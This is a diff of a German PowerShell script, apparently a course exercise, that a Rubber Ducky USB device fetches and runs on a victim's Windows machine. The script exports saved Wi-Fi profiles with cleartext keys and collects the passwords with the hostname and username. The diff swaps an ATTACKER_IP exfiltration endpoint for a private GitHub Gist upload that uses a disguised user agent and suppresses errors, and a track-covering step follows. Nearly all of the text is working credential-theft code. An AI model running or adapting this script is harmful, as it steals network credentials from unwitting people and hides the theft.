@@ -1,34 +1,48 @@
 # ============================================================
-#  W02a.6 – Custom Attack: WLAN-Passwörter exfiltrieren
+#  W02a.6 – WLAN-Passwörter exfiltrieren
 #  Autoren: Raphael Bleier, Joachim Lugger
-#  Wird per IEX vom Rubber Ducky heruntergeladen und ausgeführt
+#  Exfiltration: Privates GitHub Gist (kein lokaler Server)
 #
-#  Ziel: Gespeicherte WLAN-Passwörter des Opfer-Systems stehlen
-#  Ersetze ATTACKER_IP mit der echten IP-Adresse!
+#  Setup: GITHUB_PAT durch eigenen Token ersetzen (Scope: gist)
 # ============================================================
 
-$ATTACKER = "http://ATTACKER_IP:8080/collect"
+$GITHUB_PAT = "GITHUB_PAT_HERE"
 
-# WLAN-Profile als XML mit Klartextpasswörtern exportieren
 $tmpDir = $env:TEMP
 Push-Location $tmpDir
 
 try {
-    # Alle WLAN-Profile exportieren (key=clear = Klartextpasswort in XML)
+    # WLAN-Profile mit Klartextpasswörtern exportieren
     netsh wlan export profile key=clear | Out-Null
 
-    # keyMaterial-Tag enthält das Passwort im Klartext
+    # <keyMaterial> = Passwort im Klartext
     $passwords = Select-String -Path "Wi-Fi-*.xml" -Pattern "<keyMaterial>(.*)</keyMaterial>" |
                  ForEach-Object {
-                     $file = $_.Filename -replace "Wi-Fi-|\.xml", ""
+                     $ssid = $_.Filename -replace "Wi-Fi-|\.xml", ""
                      $pass = $_.Matches.Groups[1].Value
-                     "SSID: $file | Passwort: $pass"
+                     "SSID: $ssid | Passwort: $pass"
                  }
 
-    $report = "=== WIFI PASSWORDS ===`n" + ($passwords -join "`n")
+    $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
+              "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
+              ($passwords -join "`n")
 
-    # Exfiltrieren
-    Invoke-WebRequest -Uri $ATTACKER -Method POST -Body $report -UseBasicParsing | Out-Null
+    # Exfil via privates GitHub Gist
+    $headers = @{
+        "Authorization" = "token $GITHUB_PAT"
+        "Content-Type"  = "application/json"
+        "User-Agent"    = "git/2.40.0"
+    }
+    $body = @{
+        description = "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm')"
+        public      = $false
+        files       = @{ "wifi.txt" = @{ content = $report } }
+    } | ConvertTo-Json -Depth 5
+
+    try {
+        Invoke-RestMethod -Uri "https://api.github.com/gists" `
+            -Method POST -Headers $headers -Body $body | Out-Null
+    } catch { }
 
 } finally {
     # Spuren verwischen
